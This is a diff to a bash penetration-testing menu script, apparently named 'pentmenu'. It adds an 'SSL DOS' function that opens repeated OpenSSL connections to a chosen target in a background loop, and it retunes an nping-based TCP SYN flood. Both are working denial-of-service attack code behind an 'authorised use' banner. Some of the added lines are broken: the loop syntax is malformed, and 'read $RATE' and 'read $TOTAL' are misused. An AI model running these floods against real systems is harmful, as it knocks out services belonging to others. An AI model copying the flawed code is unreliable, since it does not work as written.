@@ -1,4 +1,16 @@
 #!/bin/bash
+## create ssldos function
+ssldos() 
+{ echo "using openssl for SSL DOS"
+echo "Enter target:"
+read TARGET
+echo "Enter target port:"
+read PORT
+echo "Starting SSL DOS attack" 
+while : for i in {1..10} 
+do openssl s_client -connect $TARGET:$PORT 2>/dev/null & 
+done
+}
 ## create listener function
 listener ()
 { echo "Enter protocol, [t]cp (default) or [u]dp:"
@@ -46,12 +58,12 @@ bannergrab()
 		echo -e "HEAD / HTTP/1.0\r\n\r\n"| nc -vw 2 $TARGET $PORT
 }
 ## create menu and show welcome message
-echo ""
+clear && echo ""
 echo "Hello and welcome to pentmenu!"
 echo "This software is only for responsible, authorised use."
 echo "YOU are responsible for your own actions!"
 echo ""
-options=("Show IP" "TCP Port Scanner" "Banner Grabber" "TCP SYN Flood" "Create Listener" "Quit")
+options=("Show IP" "TCP Port Scanner" "Banner Grabber" "TCP SYN Flood" "SSL DOS" "Create Listener" "Quit")
 select opt in "${options[@]}"; do
 ## quit 
 	if [ "$opt" = "Quit" ]; then
@@ -99,12 +111,12 @@ select opt in "${options[@]}"; do
 	echo "Enter Source IP or use [i]nterface IP (default):"
 	read SOURCE
 	: ${SOURCE:=i}
-	echo "Enter number of packets to send per second (default is 10000):"
-	read RATE
-	: ${RATE:=10000}
-	echo "Enter total number of packets to send (default is 100000):"
-	read TOTAL
-	: ${TOTAL:=100000}
+	echo "Enter number of packets to send per second (default is 1000):"
+	read $RATE
+	: ${RATE:=1000}
+	echo "Enter total number of packets to send (default is 10000):"
+	read $TOTAL
+	: ${TOTAL:=10000}
 	echo "Starting TCP SYN Flood..."
 	if 	[ "$SOURCE" = "i" ]; then
 	sudo nping --tcp -p $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
@@ -125,6 +137,9 @@ select opt in "${options[@]}"; do
 ## Simple Banner Grabber
 	elif [ "$opt" = "Banner Grabber" ]; then
 	bannergrab
+## SSL DOS
+	elif [ "$opt" = "SSL DOS" ]; then
+	ssldos
 ## Default if no menu option selected is to return an error
 	else
   	echo  "That's not a valid option! Hit Return to show main menu"
